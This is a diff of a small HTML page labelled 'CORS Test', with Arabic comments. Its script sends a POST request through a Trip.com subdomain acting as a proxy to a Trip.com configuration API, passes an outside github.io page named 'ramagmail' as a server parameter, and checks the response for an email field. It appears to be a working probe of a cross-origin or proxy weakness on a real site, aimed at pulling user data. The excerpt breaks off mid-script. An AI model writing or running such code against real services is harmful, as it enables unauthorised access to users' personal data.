@@ -4,10 +4,14 @@
 <h1>CORS Test</h1>
 <pre id="result"></pre>
 <script>
-// ===== استخدام Proxy يدعم POST =====
+// ===== الـ Proxy =====
 const PROXY_URL = "https://chloro.trip.com/";
 const TARGET_URL = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https://omar.trip.com";
 
+// ===== البيانات للـ Proxy (text/plain) =====
+const bodyData = "data=&version=11&serverName=https://anonymous56430.github.io/ramagmail/&guid=";
+
+// ===== البيانات للـ Target (JSON) =====
 const tripData = {
   head: {
     locale: "",
@@ -24,16 +28,19 @@ const tripData = {
   customParam: {}
 };
 
+// ===== إرسال الطلب =====
 fetch(PROXY_URL + TARGET_URL, {
   method: "POST",
   headers: {
-    "Content-Type": "application/json"
+    "Content-Type": "text/plain"  // للـ Proxy
   },
-  body: JSON.stringify(tripData)
+  body: bodyData  // النص العادي للـ Proxy
 })
 .then(r => r.text())
 .then(responseText => {
   document.getElementById("result").textContent = "Status: 200\n\n" + responseText;
+  
+  // محاولة تحويل الرد لـ JSON
   try {
     const jsonResponse = JSON.parse(responseText);
     if (jsonResponse.email) {
